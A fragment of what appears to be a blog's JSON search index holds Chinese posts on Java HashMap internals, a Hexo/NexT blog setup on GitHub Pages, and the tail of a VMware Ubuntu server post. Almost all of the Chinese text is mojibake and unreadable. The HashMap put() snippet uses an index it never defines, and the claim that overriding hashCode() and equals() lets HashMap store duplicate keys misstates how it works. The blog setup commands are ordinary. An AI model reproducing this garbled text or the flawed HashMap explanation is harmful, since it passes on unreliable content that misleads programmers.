¡Labçš„æ—¶å€™ï¼Œéƒ½ä¼šæœ‰åœ¨éœ€è¦å®‰è£…è½¯ä»¶æˆ–è€…æ›´æ–°è½¯ä»¶çš„æ—¶å€™ï¼Œç”±äºæ²¡æœ‰Rootæƒé™è€Œå¯¼è‡´è‡ªå·±éœ€è¦é‡æ–°æƒ³åŠæ³•å¤„ç†ï¼Œæˆ–è€…æ¢åˆ°VPSä¸Šå»å¤„ç†çš„æƒ…å†µå‘ç”Ÿã€‚æ¯å½“è¿™ä¸ªæ—¶å€™ï¼Œéƒ½åœ¨è€ƒè™‘ï¼Œæ˜¯å¦å¯ä»¥åœ¨VMä¸­æ„å»ºä¸€ä¸ªè‡ªå·±åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è®¿é—®çš„æœåŠ¡å™¨ï¼Ÿ\n","tags":"Linux","title":"åœ¨VMwareå†…æ„å»ºä¸€ä¸ªå¤–ç½‘å¯ä»¥è®¿é—®çš„UbuntuæœåŠ¡å™¨","type":"post"},{"authors":null,"categories":null,"content":" HashMapç›¸å…³ å¸¸ç”¨å‡½æ•°è¯´æ˜ å¦‚ä½•åœ¨Hashmapä¸­æ’å…¥ç›¸åŒçš„keyå€¼ è¦åœ¨HashMapä¸­æ’å…¥é‡å¤çš„å€¼ï¼Œé¦–å…ˆéœ€è¦å¼„æ¸…æ¥šHashMapé‡Œé¢æ˜¯æ€ä¹ˆå­˜æ”¾å…ƒç´ çš„ã€‚\nputæ–¹æ³•: Mapé‡Œé¢å­˜æ”¾çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯key-valueè¿™æ ·çš„é”®å€¼å¯¹ï¼Œè€Œä¸”éƒ½æ˜¯é€šè¿‡putæ–¹æ³•è¿›è¡Œæ·»åŠ çš„ï¼Œè€Œä¸”ç›¸åŒçš„keyåœ¨Mapä¸­åªä¼šæœ‰ä¸€ä¸ªä¸ä¹‹å…³è”çš„valueå­˜åœ¨ã€‚putæ–¹æ³•åœ¨Mapä¸­çš„å®šä¹‰å¦‚ä¸‹ã€‚\nput(K key, V value);\nput()æ–¹æ³•å®ç°ï¼šé¦–å…ˆhash(key)å¾—åˆ°keyçš„hashcode()ï¼Œhashmapæ ¹æ®è·å¾—çš„hashcodeæ‰¾åˆ°è¦æ’å…¥çš„ä½ç½®æ‰€åœ¨çš„é“¾ï¼Œåœ¨è¿™ä¸ªé“¾é‡Œé¢æ”¾çš„éƒ½æ˜¯hashcodeç›¸åŒçš„Entryé”®å€¼å¯¹ï¼Œåœ¨æ‰¾åˆ°è¿™ä¸ªé“¾ä¹‹åï¼Œä¼šé€šè¿‡equals()æ–¹æ³•åˆ¤æ–­æ˜¯å¦å·²ç»å­˜åœ¨è¦æ’å…¥çš„é”®å€¼å¯¹ï¼Œè€Œè¿™ä¸ªequalsæ¯”è¾ƒçš„å…¶å®å°±æ˜¯keyã€‚\npublic V put(K key,V value) Parameters: key - key with which the specified value is to be associated value - value to be associated with the specified key Return: the previous value associated with key, or null if there was no mapping for key. å®ƒç”¨æ¥å­˜æ”¾key-valueè¿™æ ·çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè¿”å›å€¼æ˜¯keyåœ¨Mapä¸­å­˜æ”¾çš„æ—§valueï¼Œå¦‚æœä¹‹å‰ä¸å­˜åœ¨åˆ™è¿”å›nullã€‚HashMapçš„putæ–¹æ³•æ˜¯è¿™æ ·å®ç°çš„ã€‚\npublic V put(K key, V value) { if (key == null) return putForNullKey(value); int hash = hash(key); for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } ä»ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æ·»åŠ å¯¹åº”çš„key-valueè¿™æ ·çš„ç»„åˆæ—¶ï¼Œå¦‚æœåŸæœ¬å·²ç»å­˜åœ¨å¯¹åº”çš„keyï¼Œåˆ™ç›´æ¥æ”¹å˜å¯¹åº”çš„valueï¼Œå¹¶è¿”å›æ—§çš„valueï¼Œè€Œåœ¨åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨çš„æ—¶å€™æ˜¯å…ˆæ¯”è¾ƒkeyçš„hashCodeï¼Œå†æ¯”è¾ƒç›¸ç­‰æˆ–equalsçš„ã€‚ ç›´æ¥ä»ä¸Šé¢ä»£ç æ¥çœ‹æ˜¯æ¯”è¾ƒçš„å¯¹åº”Map.Entryçš„hashCodeå’Œkeyçš„hashCodeï¼Œè€Œå®é™…ä¸ŠMap.Entryçš„hashCodeå…¶å®å°±æ˜¯å…¶å­˜æ”¾keyçš„hashCodeã€‚è€Œå¦‚æœå¯¹åº”çš„keyåŸæœ¬ä¸å­˜åœ¨çš„è¯å°†è°ƒç”¨addEntryå°†å¯¹åº”çš„key-valueæ·»åŠ åˆ°Mapä¸­ã€‚addEntryä¼ é€’çš„å‚æ•°hashå°±æ˜¯å¯¹åº”keyçš„hashCodeã€‚ å®ç°æ·»åŠ é‡å¤å…ƒç´  é€šè¿‡å¯¹put()æ–¹æ³•çš„ç ”ç©¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåˆ¤æ–­keyæ˜¯å¦å­˜åœ¨çš„æ—¶å€™æ˜¯å…ˆæ¯”è¾ƒkeyçš„hashCodeï¼Œå†æ¯”è¾ƒç›¸ç­‰æˆ–equalsçš„ï¼Œæ‰€ä»¥é‡å†™hashCode()å’Œequals()æ–¹æ³•å³å¯å®ç°æ·»åŠ é‡å¤å…ƒç´ ã€‚\n@Override public int hashCode(){ return this.arga.hashCode() * this.argb.hashCode() ; } @Override public boolean equals(Object obj) { if (this == obj) { return true; } if (!(obj instanceof MyType)) { return false; } MyType p = (MyType) obj; if (this.arga.equals(p.arga) \u0026amp;\u0026amp; this.argb.equals(p.argb)) { return true ; } else { return false ; } } é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•ä¹‹åå°±å¯ä»¥è¦†ç›–é‡å¤çš„é”®å€¼å¯¹ï¼Œå¦‚æœéœ€è¦å¯¹valueè¿›è¡Œå åŠ ï¼Œè°ƒç”¨put()æ–¹æ³•ä¹‹å‰ç”¨containsKey()æ–¹æ³•åˆ¤æ–­æ˜¯å¦æœ‰é‡å¤çš„é”®å€¼ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ç”¨get()æ–¹æ³•è·å–åŸæœ‰çš„valueï¼Œå†åŠ ä¸Šæ–°åŠ å…¥çš„valueå³å¯ã€‚\n","date":1526048905,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526048905,"objectID":"2682d42e8910d5056d2363d0ec83eef1","permalink":"http://www.guozet.me/post/Record-some-java-Function-when-I-code-on-Leetcode/","publishdate":"2018-05-11T14:28:25Z","relpermalink":"/post/Record-some-java-Function-when-I-code-on-Leetcode/","section":"post","summary":"HashMapç›¸å…³ å¸¸ç”¨å‡½æ•°è¯´æ˜ å¦‚ä½•åœ¨Hashmapä¸­æ’å…¥ç›¸åŒ","tags":null,"title":"Record some java Function when I code on Leetcode","type":"post"},{"authors":null,"categories":"Life","content":"ä½¿ç”¨Jekyllæ­å»ºåœ¨githubä¸Šåšå®¢å·²ç»å¿«ä¸€å¹´äº†ï¼Œä½†ä¸€å¹´çš„æ—¶é—´å¹¶æ²¡æœ‰å†™å¾ˆå¤šçš„æ–‡ç« ã€‚ä¸€éƒ¨åˆ†åŸå› æ˜¯ç”±äºè‡ªå·±æ‡ˆæ€ ï¼Œå¦ä¸€éƒ¨åˆ†ä¹Ÿç”±äºJekyllå†™åšå®¢æœ‰å¾ˆå¤šä¸ä¾¿ä¹‹å¤„ã€‚ä¸èƒ½è‡ªåŠ¨ç”Ÿæˆç›®å½•ï¼Œä»¥åŠæ¯æ¬¡æ–°å»ºæ–‡ç« éƒ½éœ€è¦è‡ªå·±çš„æ‰‹åŠ¨è®¾ç½®ç›®å½•ç»“æ„ä»¥åŠæ·»åŠ Jekyllè§£æçš„æ ¼å¼å†…å®¹åœ¨æ¯ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œè¿™æ˜¯ä¸€ä»¶éå¸¸ç¹çè€Œæ— è¶£çš„å·¥ä½œã€‚éµå¾ªè‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿçš„åŸåˆ™ï¼ŒæŸ¥è¯¢ç›®å‰æ¯”è¾ƒæµè¡Œçš„æ­å»ºåšå®¢çš„æ–¹å¼ä¹‹åï¼Œå†³å®šä½¿ç”¨Hero+Nextä¸»é¢˜åœ¨githubä¸Šæ­å»ºåšå®¢ã€‚æœ¬ç¯‡åšå®¢è®°å½•æ­å»ºè¿‡ç¨‹ä¸­çš„é…ç½®ä¸ä¼˜åŒ–ã€‚\nå…·ä½“æ­å»ºåšå®¢è¿‡ç¨‹è¯·å‚è€ƒï¼š\nJekyllè¿ç§»åˆ°Hexoæ­å»ºä¸ªäººåšå®¢\né€‚åˆç†Ÿæ‚‰åŸç†çš„åŒå­¦ï¼Œä½œè€…è¯¦ç»†çš„è®²è§£äº†ä½¿ç”¨Hexoä¸Nextä¸»é¢˜æ­å»ºåšå®¢çš„è¿‡ç¨‹ã€‚\nå¦‚æœå®Œå…¨ä¸ç†Ÿæ‚‰Hexoçš„åŸç†ä»¥åŠä¹‹å‰æ²¡æœ‰ä½¿ç”¨è¿‡gitçš„åŒå­¦ï¼Œè¯·å‚è€ƒï¼š\nä½¿ç”¨ Hexo åŸºäº GitHub Pages æ­å»ºä¸ªäººåšå®¢ï¼ˆä¸€ï¼‰\nä½¿ç”¨ Hexo åŸºäº GitHub Pages æ­å»ºä¸ªäººåšå®¢ï¼ˆäºŒï¼‰\nå®ŒæˆHexoæ­å»ºåšå®¢ä¹‹åï¼Œå¯ä»¥å‚è€ƒä¸€äº›é…ç½®è¯´æ˜,åšä¸€äº›ä¼˜åŒ–ï¼š\nä½¿ç”¨ Hexo åŸºäº GitHub Pages æ­å»ºä¸ªäººåšå®¢\nHexoåŸºæœ¬æ“ä½œ åŸºæœ¬å‘½ä»¤ hexo new \u0026quot;postName\u0026quot; #æ–°å»ºæ–‡ç« \rhexo new page \u0026quot;pageName\u0026quot; #æ–°å»ºé¡µé¢\rhexo generate #ç”Ÿæˆé™æ€é¡µé¢è‡³publicç›®å½•\rhexo server #å¼€å¯é¢„è§ˆè®¿é—®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£4000ï¼Œ'ctrl + c'å…³é—­serverï¼‰\rhexo deploy #å°†.deployç›®å½•éƒ¨ç½²åˆ°GitHub\rhexo help # æŸ¥çœ‹å¸®åŠ©\rhexo version #æŸ¥çœ‹Hexoçš„ç‰ˆæœ¬\rhexo deploy -g #ç”ŸæˆåŠ éƒ¨ç½²\rhexo server -g #ç”ŸæˆåŠ é¢„è§ˆ\rå‘½ä»¤çš„ç®€å†™\rhexo n == hexo new\rhexo g == hexo generate\rhexo s == hexo server\rhexo d == hexo deploy\rHexo æ–‡ç« å›¾ç‰‡ç®¡ç† æ•°æ— å½¢æ—¶å°‘ç›´è§‰ï¼Œå¾ˆå¤šæ—¶å€™ä¸€ä¸ªé…å›¾èƒ½æ¸…æ™°çš„è¡¨è¾¾æˆ‘ä»¬çš„è§‚ç‚¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ç ”ç©¶Hexoå†™æ–‡ç« æ—¶æ’å…¥å›¾ç‰‡çš„æ–¹æ³•ã€‚ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š\næœ¬åœ°å¼•ç”¨\né€‚ç”¨åœºæ™¯ï¼š å°‘é‡å›¾ç‰‡ + Blogæ­è½½å¹³å°ç©ºé—´å……è¶³\nä¼˜åŠ¿ï¼š ç®€æ´æ–¹ä¾¿\nè¿œç¨‹å›¾åºŠå¼•ç”¨\né€‚ç”¨åœºæ™¯ï¼šæ·±åº¦ä½¿ç”¨ç”¨æˆ· + æ–‡ç« æ’å…¥å›¾ç‰‡çš„éœ€æ±‚è¾ƒé«˜ + Blogæ­è½½å¹³å°ç©ºé—´ä¸è¶³ ä¼˜åŠ¿ï¼š èƒ½å¤Ÿæ»¡è¶³è‡ªå·±æ’å…¥å›¾ç‰‡çš„éœ€æ±‚ï¼Œä¸ç”¨è€ƒè™‘ç©ºé—´é—®é¢˜ ç¼ºç‚¹ï¼š æ‰€æœ‰æ–‡ç« ä¸­çš„å›¾ç‰‡å—åˆ¶äºè¿œç¨‹å›¾åºŠæœåŠ¡å™¨çš„é™åˆ¶ï¼Œå¦‚æœæœåŠ¡å™¨å‡ºç°é—®é¢˜ï¼Œæ‰€æœ‰å›¾ç‰‡éƒ½ä¸èƒ½åŠ è½½äº† æœ¬åœ°å¼•ç”¨ ç»å¯¹è·¯å¾„å¼•ç”¨(æˆ‘é€‰æ‹©çš„æ–¹å¼ï¼Œéœ€è¦èƒ½å¤Ÿåœ¨é¦–é¡µä¸Šæ˜¾ç¤ºå›¾ç‰‡) å½“Hexoé¡¹ç›®ä¸­åªç”¨åˆ°å°‘é‡å›¾ç‰‡æ—¶ï¼Œå¯ä»¥å°†å›¾ç‰‡ç»Ÿä¸€æ”¾åœ¨source/imagesæ–‡ä»¶å¤¹ä¸­ï¼Œé€šè¿‡markdownè¯­æ³•è®¿é—®å®ƒä»¬ã€‚\nsource/images/image.jpg\n![](/images/image.jpg)\nä¼˜åŠ¿ï¼šå›¾ç‰‡æ—¢å¯ä»¥åœ¨é¦–é¡µå†…å®¹ä¸­è®¿é—®åˆ°ï¼Œä¹Ÿå¯ä»¥åœ¨æ–‡ç« æ­£æ–‡ä¸­è®¿é—®åˆ°ã€‚\nç›¸å¯¹è·¯å¾„å¼•ç”¨ é…ç½®ç«™ç‚¹_config.ymlæ–‡ä»¶ å¦å¤–ä¹Ÿå¯ä»¥å°†å›¾ç‰‡æ”¾åœ¨æ–‡ç« è‡ªå·±çš„ç›®å½•ä¸­ã€‚æ–‡ç« çš„ç›®å½•å¯ä»¥é€šè¿‡é…ç½®ç«™ç‚¹_config.ymlæ¥ç”Ÿæˆã€‚\n_config.yml\n\u0026lsquo;post_asset_folder: true\u0026rsquo;\nå°†post_asset_folderè®¾ä¸ºtrueåï¼Œæ‰§è¡Œå‘½ä»¤ï¼š\n$ hexo new post_name\nåœ¨source/_postsä¸­ä¼šç”Ÿæˆæ–‡ç« post_name.mdå’ŒåŒåæ–‡ä»¶å¤¹post_nameã€‚å°†å›¾ç‰‡èµ„æºæ”¾åœ¨post_nameä¸­ï¼Œæ–‡ç« å°±å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„å¼•ç”¨å›¾ç‰‡èµ„æºäº†ã€‚\n_posts/post_name/image.jpg\nå‚è€ƒåšæ–‡ï¼š åœ¨ hexo ä¸­æ— ç—›ä½¿ç”¨æœ¬åœ°å›¾ç‰‡\nMarkdownç›´æ¥å¼•ç”¨å›¾ç‰‡ ![](image.jpg)\nä¸Šè¿°æ˜¯markdownçš„å¼•ç”¨æ–¹å¼ï¼Œå›¾ç‰‡æ”¾åœ¨æ–‡ç« æ‰€åœ¨çš„ç›®å½•ä¸‹ï¼Œæˆ–è€…å­ç›®å½•ä¸‹ï¼Œå›¾ç‰‡åªèƒ½åœ¨æ–‡ç« ä¸­æ˜¾ç¤ºï¼Œä½†æ— æ³•åœ¨é¦–é¡µä¸­æ­£å¸¸æ˜¾ç¤ºã€‚\nå¦‚æœå¸Œæœ›å›¾ç‰‡åœ¨æ–‡ç« å’Œé¦–é¡µä¸­åŒæ—¶æ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨æ ‡ç­¾æ’ä»¶è¯­æ³•ã€‚\n_posts/post_name/image.jpg\n{% asset_img image.jpg This is an image %}\rè¿œç¨‹å›¾åºŠå¼•ç”¨ é™¤äº†åœ¨æœ¬åœ°å­˜å‚¨å›¾ç‰‡ï¼Œè¿˜å¯ä»¥å°†å›¾ç‰‡ä¸Šä¼ åˆ°ä¸€äº›å…è´¹çš„CDNæœåŠ¡ä¸­ã€‚æ¯”å¦‚Cloudinaryæä¾›çš„å›¾ç‰‡CDNæœåŠ¡ï¼Œåœ¨Cloudinaryä¸­ä¸Šä¼ å›¾ç‰‡åï¼Œä¼šç”Ÿæˆå¯¹åº”çš„urlåœ°å€ï¼Œå°†åœ°å€ç›´æ¥æ‹¿æ¥å¼•ç”¨å³å¯ã€‚\nå‚è€ƒåšæ–‡ï¼š ä½¿Hexoæ–‡ç« å›¾æ–‡å¹¶èŒ‚\nè¯¥ç¯‡æ–‡ç« è¯¦ç»†è®²è§£å¦‚ä½•ä½¿ç”¨æ–°æµªå¾®åšå›¾åºŠæ¥å®ç°åœ¨Hexoæ–‡ç« ä¸­æ’å…¥å›¾ç‰‡\nHexoçš„ç‰ˆæœ¬æ§åˆ¶æ–¹å¼ æˆ‘ä»¬å°†Hexoç”Ÿå‡ºæ¥çš„é™æ€ç½‘ç«™æ”¾åˆ°äº†Github Pagesä¸Šé¢å»æ‰˜ç®¡äº†ã€‚è€Œæˆ‘ä»¬ä¸€èˆ¬ä¹Ÿåœ¨åœ¨æœ¬åœ°æ­å»ºHexoçš„ç¯å¢ƒï¼Œç¼–å†™æ–°æ–‡ç« ï¼Œç„¶ååˆ©ç”¨hexo deployæ¥å‘å¸ƒåˆ°Gitï¼Œé‚£ä¹ˆå¯¹äºæœ¬åœ°çš„Hexoçš„åŸå§‹æ–‡ä»¶æ€ä¹ˆç®¡ç†å‘¢ï¼Ÿç®¡ç†Hexoçš„åŸå§‹æ–‡ä»¶çš„å¥½å¤„æ˜¯ï¼š\næ¢ç”µè„‘å¸ƒç½®ç¯å¢ƒéå¸¸æ–¹ä¾¿ ä¸ç”¨æ‹…å¿ƒæœ¬åœ°ç¯å¢ƒæŒ‚äº†å¯¼è‡´æºæ–‡ä»¶æµå¤±ï¼Œæ¯•ç«Ÿä¸€æŠ˜è…¾å°±å®¹æ˜“æåç¯å¢ƒçš„ æˆ‘ä»¬å¯ä»¥æŠŠHexoåšå®¢çš„æºæ–‡ä»¶ä¹ŸHoståœ¨githubä¸Šï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æŠŠHexoåšå®¢çš„æºæ–‡ä»¶å¸ƒç½®åˆ°å’ŒBlogåŒä¸€ä¸ªusername.github.ioä»“åº“ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å°†Hexoçš„æºæ–‡ä»¶æ¨åˆ°æ–°å»ºçš„ä¸€ä¸ªGithub Repo.\nåˆ©ç”¨Githubåˆ†æ”¯è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ åˆ©ç”¨åˆ†æ”¯è¿›è¡Œç‰ˆæœ¬æ§åˆ¶çš„æµç¨‹ é€šè¿‡æ–°å»ºä¸€ä¸ªhexoåˆ†æ”¯ç”¨äºä¸“é—¨å­˜æ”¾hexoä»£ç ã€‚åŸå…ˆçš„masteråˆ†æ”¯ä¾ç„¶ä¸å˜ï¼Œä½œä¸ºhexoéƒ¨ç½²çš„åˆ†æ”¯ã€‚ æ¯æ¬¡åœ¨éƒ¨ç½²åï¼Œå†æŠŠä»£ç æäº¤åˆ°hexoåˆ†æ”¯:\nåˆ°è¾¾Blogçš„æœ¬åœ°æ–‡ä»¶æ ¹ç›®å½•ï¼Œæœ¬åœ°åˆ›å»ºgitä»“åº“\ngit init\næ·»åŠ è¿œç¨‹åº“\ngit remote add origin git@github.com:user.name/user.name.github.io\næ³¨æ„ï¼Œå°†å…¶ä¸­çš„ä¸¤ä¸ªuser.nameç½®æ¢æˆä½ è‡ªå·±çš„githubåç§°\nåˆ›å»ºhexoåˆ†æ”¯\ngit checkout -b hexo\næ·»åŠ æ–‡ä»¶å¹¶æäº¤ï¼Œpushåˆ°è¿œç¨‹ä»“åº“\ngit add\nå¯èƒ½å‡ºç°çš„é—®é¢˜ï¼šå¦‚æœä½ ä½¿ç”¨äº†ç¬¬ä¸‰æ–¹ä¸»é¢˜ï¼Œåœ¨è¿›è¡Œä»£ç æäº¤çš„æ—¶å€™ï¼Œæ˜¯æ— æ³•å°†ç¬¬ä¸‰æ–¹ä¸»é¢˜æäº¤åˆ°ä½ çš„github repositoryä¸­ï¼Œä¼šå‡ºç° untracked contentçš„æç¤ºã€‚\n**åŸå› ï¼š**ç¬¬ä¸‰æ–¹ä¸»é¢˜è‡ªèº«å°±æ˜¯ä¸€ä¸ªgité¡¹ç›®ï¼Œæ˜¯æ²¡æœ‰åŠæ³•å°†æ¯”äººçš„gité¡¹ç›®é€šè¿‡addå’Œcommitçš„æ–¹å¼æ·»åŠ åˆ°è‡ªå·±çš„git repositoryçš„ã€‚\nè§£å†³æ–¹å¼ï¼š åˆ é™¤ç¬¬ä¸‰æ–¹ä¸»é¢˜æ ¹ç›®å½•ä¸‹é¢çš„.gitæ–‡ä»¶å¤¹ï¼Œå†å°è¯•æäº¤git add\næ—¥å¸¸æ”¹åŠ¨è¿‡ç¨‹ä¸­çš„æ‰§è¡Œæµç¨‹ï¼š ä¾æ¬¡æ‰§è¡Œgit add .ã€git commit -m \u0026ldquo;\u0026hellip;\u0026quot;ã€git push origin hexoæŒ‡ä»¤å°†æ”¹åŠ¨æ¨é€åˆ°GitHubï¼ˆæ­¤æ—¶å½“å‰åˆ†æ”¯åº”ä¸ºhexoï¼‰ï¼›\næ‰§è¡Œhexo g -då‘å¸ƒç½‘ç«™åˆ°masteråˆ†æ”¯ä¸Šã€‚\næœ¬åœ°èµ„æ–™ä¸¢å¤±æˆ–è€…æ¢ç”µè„‘ï¼Œåœ¨å…¶ä»–ç”µè„‘ä¸Šé¢ä¿®æ”¹åšå®¢çš„æ­¥éª¤æµç¨‹ ä½¿ç”¨ git clone git@github.com:user.name/user.name.github.io.git(é»˜è®¤çš„åˆ†æ”¯ä¸ºhexo) åœ¨æœ¬åœ°cloneä¸‹æ¥çš„user.name.github.ioæ–‡ä»¶å¤¹ä¸‹é¢é€šè¿‡git bashä¾æ¬¡æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š npm install -g hexo-cli\rnpm install hexo --save\rnpm install hexo-deployer-git\rå‚è€ƒåšå®¢\nGitHub Pages + Hexoæ­å»ºåšå®¢\nHexoåšå®¢ä»£ç ç‰ˆæœ¬æ§åˆ¶\nå…¶ä»–åŠŸèƒ½å‚è€ƒç½‘é¡µ åšå®¢é¦–é¡µçš„æ˜¾ç¤ºé—®é¢˜ å†…å®¹å…¨éƒ¨æ˜¾ç¤ºï¼Œä¸æ”¶ç¼© è§£å†³æ–¹å¼ï¼šé…ç½®Nextä¸»é¢˜ä¸­çš„_config.ymlé‡Œé¢çš„ auto_excerpt = true\nå†…å®¹æ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æ˜¾ç¤ºæ ¼å¼ä¸æ˜¯Markdownçš„æ ¼å¼ ä½¿ç”¨ æ›¿ä»£ auto_excerpt\næ·»åŠ æ–‡ç« é˜…è¯»é‡ç»Ÿè®¡ä¸è¯„è®ºåŠŸèƒ½ ä¸ºNexTä¸»é¢˜æ·»åŠ æ–‡ç« é˜…è¯»é‡ç»Ÿè®¡åŠŸèƒ½\nhexoåšå®¢è¯„è®ºæ–°ç¥å™¨â€”â€”Valine\næ·»åŠ æœç´¢åŠŸèƒ½ åœºæ™¯ åšæ–‡å¤šäº†ä¹‹åï¼Œå°±éœ€è¦ä¸€ä¸ªæœç´¢åŠŸèƒ½èƒ½å¤Ÿå¿«é€Ÿçš„æ‰¾åˆ°è‡ªå·±ä»¥å‰çš„åšå®¢ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬çš„åšå®¢ä¸ŠåŠ å…¥æœç´¢åŠŸèƒ½æ˜¯å¾ˆæœ‰å¿…è¦çš„ä¸€ä»¶äº‹æƒ…ã€‚\nå®‰è£…æ’ä»¶ ç›´æ¥åœ¨è‡ªå·±çš„åšå®¢æ–‡ä»¶å¤¹ä¸‹ï¼Œç‚¹å‡»é¼ æ ‡å³é”®é€‰æ‹©Git Bash Here\nnpm install hexo-generator-searchdb --save\nä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶:åšå®¢æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ï¼Œå¯ä»¥åœ¨ä»»æ„ä½ç½®åŠ å…¥ï¼š\nsearch:\rpath: search.xml\rfield: post\rformat: html\rlimit: 10000\rPS:æ¯ä¸ªå†’å·åé¢éƒ½æœ‰ç©ºæ ¼ã€‚ ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ æˆ‘çš„è·¯å¾„ï¼š/blog/themes/nextä¸‹çš„_config.ymlæ–‡ä»¶ï¼Œè¿›è¡Œç¼–è¾‘ã€‚\nlocal_search:\renable: true\rPS:å†’å·åé¢éƒ½æœ‰ç©ºæ ¼ã€‚ æ­¤æ—¶ï¼Œéƒ¨ç½²åˆ°githubï¼Œæ‰“å¼€ç½‘é¡µå°±å¯ä»¥çœ‹åˆ°æœç´¢åŠŸèƒ½äº†ï¼Œå®¹æ˜“æ·»åŠ ï¼Œä½¿ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œæ¨èæ·»åŠ ï¼Œå¢åŠ ç½‘ç«™å‹å¥½åº¦ã€‚\næ·»åŠ ç«™å†…èŠå¤©å¯¹è¯åŠŸèƒ½ Hexoåšå®¢æ·»åŠ åœ¨çº¿è”ç³»åŠŸèƒ½\næ·»åŠ RSSåŠŸèƒ½ åŸºæœ¬æ­¥éª¤ å®‰è£… RSS æ’ä»¶ åœ¨blogæ ¹ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤å®‰è£… RSS æ’ä»¶: hexo-generator-feed\nnpm install hexo-generator-feed --save\né…ç½® RSS æ’ä»¶ ç¼–è¾‘ Hexo çš„é…ç½®æ–‡ä»¶ _config.ymlï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç \n# RSS è®¢é˜…æ’ä»¶\rplugin:\r- hexo-generator-feed\r#RSS æ’ä»¶é…ç½®\rfeed:\rtype: rss2\rpath: rss.xml\rlimit: 20\rhub:\rcontent: true\rä¸»é¢˜å¼€å¯ RSS æ”¯æŒ NexT ä¸»é¢˜ï¼Œé»˜è®¤å¼€å¯ RSSã€‚å…¶å®ƒä¸»é¢˜è¯·å‚è€ƒä¸»é¢˜æ–‡æ¡£ã€‚\nç”Ÿæˆ RSS æ‰§è¡Œ hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d é‡æ–°ç”Ÿæˆåšå®¢æ–‡ä»¶å¹¶å®Œæˆéƒ¨ç½²å³å¯ã€‚\næ·»åŠ æ˜¾ç¤ºæ–‡ç« æœ€æ–°æ›´æ–°æ—¶é—´ ä¿®æ”¹ï¼ˆåšå®¢ä¸»ç›®å½•ï¼‰/themes/next/layout/_macro/post.swig æ–‡ä»¶ï¼Œåœ¨\u0026lt;span class=\u0026quot;post-time\u0026quot;\u0026gt;...\u0026lt;/span\u0026gt;æ ‡ç­¾åæ·»åŠ :\n{%if post.updated and post.updated \u0026gt; post.date%}\r\u0026lt;span class=\u0026quot;post-updated\u0026quot;\u0026gt;\r\u0026amp;nbsp; | \u0026amp;nbsp; {{ __('post.updated') }}\r\u0026lt;time itemprop=\u0026quot;dateUpdated\u0026quot; datetime=\u0026quot;{{ moment(post.updated).format() }}\u0026quot; content=\u0026quot;{{ date(post.updated, config.date_format) }}\u0026quot;\u0026gt;\r{{ date(post.updated, config.date_format) }}\r\u0026lt;/time\u0026gt;\r\u0026lt;/span\u0026gt;\r{% endif %}\ræœ€ååœ¨æ–‡ä»¶ä¸­çš„æ•ˆæœä¸ºï¼š ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼ˆåšå®¢ä¸»ç›®å½•ï¼‰``themes/next/_config.yml`ï¼Œå¢åŠ ä¸€è¡Œ\ndisplay_updated: true\nå¦‚æœéœ€è¦ä¸­æ–‡æ”¯æŒï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨ä¸­æ–‡çš„æ–‡ä»¶é‡Œé¢æ·»åŠ updatedçš„ç¿»è¯‘ï¼š åšå®¢é…ç½®æ–‡ä»¶ä¸­çš„ language å‚æ•°ä¿®æ”¹å¯¹åº”çš„è¯­è¨€é…ç½®æ–‡ä»¶ï¼ˆåšå®¢ä¸»ç›®å½•ï¼‰\n/themes/next/languages/zh_Hans.yml\nåˆ°è¿™é‡Œå°±è®¾ç½®å®Œæˆäº†ï¼Œå¦‚æœä½ åœ¨å†™æ–‡ç« çš„æ—¶å€™åŠ å…¥äº†Updateçš„å‚æ•°ï¼Œé‚£ä¹ˆå°±ä¼šæ˜¾ç¤ºä¸ºä½ åŠ å…¥çš„å‚æ•°æ—¶é—´ã€‚ æ¯”å¦‚ï¼šupdated: 2018-01-01 12:00:00 å¦‚æœä½ æ²¡æœ‰åŠ å…¥å‚æ•°ï¼Œé‚£ä¹ˆå°±ä¼šæ˜¾ç¤ºä¸ºè¿™ä¸ªæ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ã€‚\né—®é¢˜ æ‰“å¼€RSSçš„æ—¶å€™ï¼šå‡ºç°é”™è¯¯æç¤º This page contains the following errors:\nerror on line 317 at column 18: PCDATA invalid Char value 11\nBelow is a rendering of the page up to the first error.\næ ¹æ®é”™è¯¯æç¤ºï¼Œç”¨ç¼–è¾‘å™¨æ‰“å¼€ public ç›®å½•ä¸‹ çš„rss.xml æˆ– 